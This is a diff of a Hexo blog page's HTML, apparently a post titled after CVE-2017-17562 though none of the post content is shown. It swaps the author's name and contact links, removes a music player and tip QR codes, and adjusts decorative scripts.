-                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
-                    </ul>
-                    <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
-                    </div>
-                    <div id="wechat">
-                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-    $(function () {
-        $('.tabs').tabs();
-    });
-</script>
-
             
         </div>
     </div>
@@ -607,7 +643,7 @@ CVE-2017-17562
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -644,7 +680,7 @@ CVE-2017-17562
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -663,6 +699,9 @@ CVE-2017-17562
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
@@ -771,69 +810,15 @@ CVE-2017-17562
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
-
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="/libs/aplayer/Meting.min.js"></script>
-
-    
 
     <div class="container row center-align"
          style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2022</span>
+                <span id="year">2022</span>
             
-            <a href="/about" target="_blank">Jlan</a>
+            <a href="/about" target="_blank">J1an</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
@@ -868,7 +853,7 @@ CVE-2017-17562
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:jlan@icloud.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
     </a>
 
@@ -876,10 +861,8 @@ CVE-2017-17562
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
+    <a href="https://twitter.com/J1an45" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/J1an45" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
     </a>
 
 
@@ -888,9 +871,7 @@ CVE-2017-17562
 
 
 
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
+
 
 </div>
     </div>
@@ -1050,6 +1031,14 @@ $(function () {
     
 
     <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
     
 
      
@@ -1076,8 +1065,6 @@ $(function () {
     })();
 </script>
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
     
     
     <script async src="/libs/others/busuanzi.pure.mini.js"></script>
